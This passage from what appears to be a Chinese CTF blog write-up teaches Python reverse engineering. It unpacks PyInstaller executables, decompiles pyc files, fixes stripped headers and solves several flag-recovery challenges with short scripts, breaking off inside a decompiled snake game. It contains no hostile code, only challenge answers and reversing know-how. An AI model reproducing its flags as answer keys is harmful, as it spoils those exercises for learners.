src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721203111039-65cd225b-d6e3-4c27-9eb2-48c486bd6637-727804.png" alt="1721203111039-65cd225b-d6e3-4c27-9eb2-48c486bd6637.png"></p><p>python逆向</p><p><font style="color:rgb(77, 77, 77);">pyinstxtractor下载链接-&gt;</font><a href="https://github.com/extremecoders-re/pyinstxtractor">GitHub - extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor</a></p><p><font style="color:rgb(77, 77, 77);">uncompyle6库下载命令-&gt;cmd窗口输入【</font><strong><font style="color:rgb(77, 77, 77);">pip install uncompyle6</font></strong><font style="color:rgb(77, 77, 77);">】</font></p><p><font style="color:rgb(77, 77, 77);">这里已经下载完成了</font></p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721203317605-5da7ad51-30bf-4077-8f44-1833bc6906bc-998695.png" alt="1721203317605-5da7ad51-30bf-4077-8f44-1833bc6906bc.png"></p><p>然后进行反编译，<font style="color:rgb(77, 77, 77);">在cmd窗口中输入命令【</font><strong><font style="color:rgb(77, 77, 77);">python pyinstxtractor.py 文件路径</font></strong><font style="color:rgb(77, 77, 77);">】</font></p><p><font style="color:rgb(77, 77, 77);">这里懒得输文件路径，索性直接拿到源代码文件下面</font></p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721203409394-c24b4f93-90a4-4afc-a822-a0f5ad10b6b6-543721.png" alt="1721203409394-c24b4f93-90a4-4afc-a822-a0f5ad10b6b6.png"></p><p>可以得到一个文件夹</p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721203679615-679c60ba-196e-46c4-8b5d-b3f062c22aea-470800.png" alt="1721203679615-679c60ba-196e-46c4-8b5d-b3f062c22aea.png"></p><p><font style="color:rgb(77, 77, 77);">此时在同目录下产生一个【</font><strong><font style="color:rgb(77, 77, 77);">xx.exe_extracted</font></strong><font style="color:rgb(77, 77, 77);">】文件夹，双击进入此文件夹，找到一个pyc文件（此处有两个文件，我们关注的是除struct.pyc外的另一个pyc文件，如下图红圈）</font></p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721203698089-38d6150d-8e8a-4c8e-acca-b28d291c2c7e-347538.png" alt="1721203698089-38d6150d-8e8a-4c8e-acca-b28d291c2c7e.png"></p><p>然后我们忽略那个struct.pyc ,对另外一个pyc进行反编译</p><p><font style="color:rgb(77, 77, 77);">在此处再次打开终端，输入命令【</font><strong><font style="color:rgb(77, 77, 77);">uncompyle6 src.pyc &gt; src.py</font></strong><font style="color:rgb(77, 77, 77);">】之后即可在同目录下生成反编译的python文件</font></p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721203938856-2d9e294a-4d6d-4961-b07e-eb3dd4c7f9ce-812198.png" alt="1721203938856-2d9e294a-4d6d-4961-b07e-eb3dd4c7f9ce.png"><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721203953404-33bb6968-a6ff-412f-a8b3-ecdcaef73a5e-716444.png" alt="1721203953404-33bb6968-a6ff-412f-a8b3-ecdcaef73a5e.png"></p><p>然后就可以看到反编译成功的py文件啦</p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721203992769-e9d81411-49a0-48d6-9da2-514522922429-487363.png" alt="1721203992769-e9d81411-49a0-48d6-9da2-514522922429.png">只要令flag&#x3D;decrypt2(“AAAAAAAAAAAfFwwRSAIWWQ&#x3D;&#x3D;”, key),key也已经说明</p><p>即可获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs plain"># uncompyle6 version 3.9.1<br># Python bytecode version base 3.4 (3310)<br># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]<br># Embedded file name: src.py<br>import rsa, base64<br>key1 = rsa.PrivateKey.load_pkcs1(base64.b64decode(&quot;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K&quot;))<br>key2 = rsa.PublicKey.load_pkcs1(base64.b64decode(&quot;LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K&quot;))<br><br>def encrypt1(message):<br>    crypto_text = rsa.encrypt(message.encode(), key2)<br>    return crypto_text<br><br><br>def decrypt1(message):<br>    message_str = rsa.decrypt(message, key1).decode()<br>    return message_str<br><br><br>def encrypt2(tips, key):<br>    ltips = len(tips)<br>    lkey = len(key)<br>    secret = []<br>    num = 0<br>    for each in tips:<br>        if num &gt;= lkey:<br>            num = num % lkey<br>        secret.append(chr(ord(each) ^ ord(key[num])))<br>        num += 1<br><br>    return base64.b64encode(&quot;&quot;.join(secret).encode()).decode()<br><br><br>def decrypt2(secret, key):<br>    tips = base64.b64decode(secret.encode()).decode()<br>    ltips = len(tips)<br>    lkey = len(key)<br>    secret = []<br>    num = 0<br>    for each in tips:<br>        if num &gt;= lkey:<br>            num = num % lkey<br>        secret.append(chr(ord(each) ^ ord(key[num])))<br>        num += 1<br><br>    return &quot;&quot;.join(secret)<br><br><br>flag = &quot;IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0=&quot;<br>key = &quot;this is key&quot;<br><br>result = decrypt2(&quot;AAAAAAAAAAAfFwwRSAIWWQ==&quot;, key)<br>print(decrypt1(base64.b64decode(decrypt2(flag, result))))<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721204088397-9f95592e-8761-47de-b20b-59c93854b61d-245159.png" alt="1721204088397-9f95592e-8761-47de-b20b-59c93854b61d.png"></h2><h2 id="2、字符与长整型的转换"><a href="#2、字符与长整型的转换" class="headerlink" title="2、字符与长整型的转换"></a>2、字符与长整型的转换</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain"># uncompyle6 version 3.9.1<br># Python bytecode version base 3.7.0 (3394)<br># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]<br># Embedded file name: .\ezPython.py<br># Compiled at: 2022-09-03 23:53:44<br># Size of source mod 2**32: 444 bytes<br>from Crypto.Util.number import *<br>import base64, base58<br>password = open(&quot;password.txt&quot;, &quot;r&quot;).read()<br>tmp = bytes_to_long(password.encode(&quot;utf-8&quot;))<br>ans = base64.b64encode(base58.b58encode(str(tmp))).decode()<br>print(&quot;I&#x27;ve forgot my password,could you please help me find the password?&quot;)<br>if ans == &quot;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==&quot;:<br>    print(&quot;You get the password!&quot;)<br>else:<br>    print(&quot;Wrong! try again&quot;)<br><br># okay decompiling ezPython.pyc<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64<br>import hashlib<br><br>import base58<br>from Crypto.Util.number import long_to_bytes<br><br>flag = &quot;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==&quot;<br>flag = base64.b64decode(flag)<br>print(flag)<br>flag = base58.b58decode(flag)<br>print(flag)<br>flag = long_to_bytes(int(flag))<br>print(flag)<br>print(type(flag))<br>#Plain Text<br>flag = flag.decode()<br>#这⾥需要将值的类型从bytes转换成str<br>flag = hashlib.md5(flag.encode(&quot;utf-8&quot;))<br>print(flag.hexdigest())<br></code></pre></td></tr></table></figure><p><font style="color:#000000;">简单的来叙述一下这个exp。<br></font><font style="color:#000000;">首先因为他加密的时候是先套base58再套base64，所以我们解密的时候就要先解开base64再解base58。因为他在加密base58的时候有转换数据类型为str（字符串）。所以我们在解密base58的时候要转换数据类型为int（整数）。<br></font><font style="color:#000000;">第一步做完了。<br></font><font style="color:#000000;">第二步因为他在加密的时候使用了字节型转长整型。<br></font><font style="color:#000000;">所以我们解密的时候就要反过来把长整型转换成字节型。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">number = 22385992650816784030032474165<br><br># 将整数转换为字节数组，使用大端（big-endian）字节序<br>number_bytes = number.to_bytes((number.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)<br><br># 将字节数组转换为字符串<br>number_str = number_bytes.decode(&#x27;latin1&#x27;)  # 使用 latin1 编码确保每个字节直接映射到字符<br>print(number_str)<br></code></pre></td></tr></table></figure><font style="color:#000000;">  </font><font style="color:#000000;">其实这一步做完之后我们已经把整个程序都解析完毕得到了flag为：HUBUCTF@1405  </font><font style="color:#000000;">但是题目要求我们的最终flag还要进行一层md5加密。  </font><font style="color:#000000;">所以我们得把HUBUCTF@1405进行md5加密一下，这里简单的方法可以使用在线网站直接加密。</font><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721205736322-729d8d9f-3ee6-48bc-8a3e-5845c28de267-763814.png" alt="1721205736322-729d8d9f-3ee6-48bc-8a3e-5845c28de267.png"><font style="color:#000000;"><br></font><font style="color:#000000;">或者就是用我exp里的办法python里的库函数进行python脚本里的md5加密。<br></font><font style="color:#000000;">最终的flag为：fd78ee3399dd6a3c1d0b637fdca0c075<br></font><font style="color:#000000;">最后这里附带上python脚本的运行结果：</font></p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721465966899-433764e6-e203-43ff-a7e7-d26be87ba859-591089.png" alt="1721465966899-433764e6-e203-43ff-a7e7-d26be87ba859.png"></p><h2 id="3、nssctf2433"><a href="#3、nssctf2433" class="headerlink" title="3、nssctf2433"></a><font style="color:#000000;">3、nssctf2433</font></h2><p><font style="color:#000000;">前面还是正常的python逆向</font></p><p><font style="color:#000000;">得到python文件<br></font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain"># uncompyle6 version 3.9.1<br># Python bytecode version base 3.7.0 (3394)<br># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]<br># Embedded file name: 1.py<br><br><br>def check():<br>    a = input(&quot;plz input your flag:&quot;)<br>    c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, <br>     78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, <br>     152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]<br>    if len(a) != 42:<br>        print(&quot;wrong length&quot;)<br>        return 0<br>    b = 179<br>    for i in range(len(a)):<br>        if ord(a[i]) * 33 % b != c[i]:<br>            print(&quot;wrong&quot;)<br>            return<br><br>    print(&quot;win&quot;)<br><br><br>check()<br><br># okay decompiling 1.pyc<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152,<br>     78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53,<br>     152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]<br>b = 179<br>a = &#x27;&#x27;<br>for i in range(len(c)):<br>    for j in range(100):<br>        temp=c[i]+j*b<br>        num = chr((c[i] + j * b) // 33)<br>        if (ord(num) &gt;= 33 and ord(num) &lt;= 127 and temp%33==0):<br>            a += num<br>            break<br><br>print(a)<br></code></pre></td></tr></table></figure><h2 id="Python逆向基本操作步骤详解——以杭电新生赛hgame-week2-reverse-stream-python3-10逆向-为例-CSDN博客magic-number"><a href="#Python逆向基本操作步骤详解——以杭电新生赛hgame-week2-reverse-stream-python3-10逆向-为例-CSDN博客magic-number" class="headerlink" title="Python逆向基本操作步骤详解——以杭电新生赛hgame week2 reverse stream(python3.10逆向)为例-CSDN博客magic number"></a><a href="https://blog.csdn.net/OrientalGlass/article/details/128693889?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172240978816800172528432%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172240978816800172528432&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-128693889-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=python%E9%80%86%E5%90%91&spm=1018.2226.3001.4187">Python逆向基本操作步骤详解——以杭电新生赛hgame week2 reverse stream(python3.10逆向)为例-CSDN博客</a>magic number</h2><h1 id="3-8以下用compyle6"><a href="#3-8以下用compyle6" class="headerlink" title="3.8以下用compyle6"></a>3.8以下用compyle6</h1><h1 id="例题（修改文件头）"><a href="#例题（修改文件头）" class="headerlink" title="例题（修改文件头）"></a><font style="color:#000000;">例题（修改文件头）</font></h1><p>先对pyc反编译</p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721375296137-1dcae075-511c-4705-b4ac-d60ec5412877-792071.png" alt="1721375296137-1dcae075-511c-4705-b4ac-d60ec5412877.png"><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721375274170-2bef2aad-83cb-4853-a4d3-5a7c36600af9-844981.png" alt="1721375274170-2bef2aad-83cb-4853-a4d3-5a7c36600af9.png"></p><p>使用010工具把struct的头八字节替换到1.pyc的最上面，为什么要替换？<br>因为用 PyInstaller 打包后，pyc 文件的前 8 个字节会被抹掉，所以最后要自己添加回去。前四个字节为 python 编译的版本，后四个字节为时间戳。想要获得编译版本可以查看打包文件里 struct 的信息，我这里还是提取出 struct 这个文件，有 struct 作为对照就方便多了，不用特定下载对应版本的 python 来生成特定的 pyc 文件来取前 8 个字节：</p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721376932445-1134c14c-e8b1-4077-ae92-4fe0faab542f-266030.png" alt="1721376932445-1134c14c-e8b1-4077-ae92-4fe0faab542f.png"></p><p>然后save，用在线的py反编译一下</p><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721379221167-29daf804-bc14-4573-846d-93f3d344aeb2-017191.png" alt="1721379221167-29daf804-bc14-4573-846d-93f3d344aeb2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python<br># visit https://tool.lu/pyc/ for more information<br># Version: Python 3.7<br><br>&#x27;&#x27;&#x27;贪吃蛇&#x27;&#x27;&#x27;<br>import random<br>import sys<br>import time<br>import pygame<br>from pygame.locals import *<br>from collections import deque<br><br>SCREEN_WIDTH = 600<br>SCREEN_HEIGHT = 480<br>SIZE = 20<br>LINE_WIDTH = 1<br>SCOPE_X = (0, SCREEN_WIDTH // SIZE - 1)<br>SCOPE_Y = (2, SCREEN_HEIGHT // SIZE - 1)<br>FOOD_STYLE_LIST = [<br>    (10, (255, 100, 100)),<br>    (20, (100, 255, 100)),<br>    (30, (100, 100, 255))]<br>LIGHT = (100, 100, 100)<br>DARK = (200, 200, 200)<br>BLACK = (0, 0, 0)<br>RED = (200, 30, 30)<br>BGCOLOR = (40, 40, 60)<br><br><br>def print_text(screen, font, x, y, text, fcolor=((255, 255, 255),)):<br>    imgText = font.render(text, True, fcolor)<br>    screen.blit(imgText, (x, y))<br><br><br>def init_snake():<br>    snake = deque()<br>    snake.append((2, SCOPE_Y[0]))<br>    snake.append((1, SCOPE_Y[0]))<br>    snake.append((0, SCOPE_Y[0]))<br>    return snake<br><br><br>def create_food(snake):<br>    food_x = random.randint(SCOPE_X[0], SCOPE_X[1])<br>    food_y = random.randint(SCOPE_Y[0], SCOPE_Y[1])<br>    while (food_x, food_y) in snake:<br>        food_x = random.randint(SCOPE_X[0], SCOPE_X[1])<br>        food_y = random.randint(SCOPE_Y[0], SCOPE_Y[1])<br>    return (food_x, food_y)<br><br><br>def get_food_style():<br>    return FOOD_STYLE_LIST[random.randint(0, 2)]<br><br><br>def main():<br>    pygame.init()<br>    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))<br>    pygame.display.set_caption(&#x27;贪吃蛇&#x27;)<br>    font1 = pygame.font.SysFont(&#x27;SimHei&#x27;, 24)<br>    font2 = pygame.font.Font(None, 72)<br>    (fwidth, fheight) = font2.size(&#x27;GAME OVER&#x27;)<br>    b = True<br>    snake = init_snake()<br>    food = create_food(snake)<br>    food_style = get_food_style()<br>    pos = (1, 0)<br>    game_over = True<br>    start = False<br>    score = 0<br>    orispeed = 0.5<br>    speed = orispeed<br>    last_move_time = None<br>    pause = False<br>    while None:<br>        for event in pygame.event.get():<br>            if event.type == QUIT:<br>                sys.exit()<br>                continue<br>            if event.type == KEYDOWN or event.key == K_RETURN or game_over:<br>                start = True<br>                game_over = False<br>                b = True<br>                snake = init_snake()<br>                food = create_food(snake)<br>                food_style = get_food_style()<br>                pos = (1, 0)<br>                score = 0<br>                last_move_time = time.time()<br>                continue<br>                if not event.key == K_SPACE or game_over:<br>                    pause = not pause<br>                    continue<br>                    if not (event.key in (K_w, K_UP) or b) and pos[1]:<br>                        pos = (0, -1)<br>                        b = False<br>                        continue<br>                        if not (event.key in (K_s, K_DOWN) or b) and 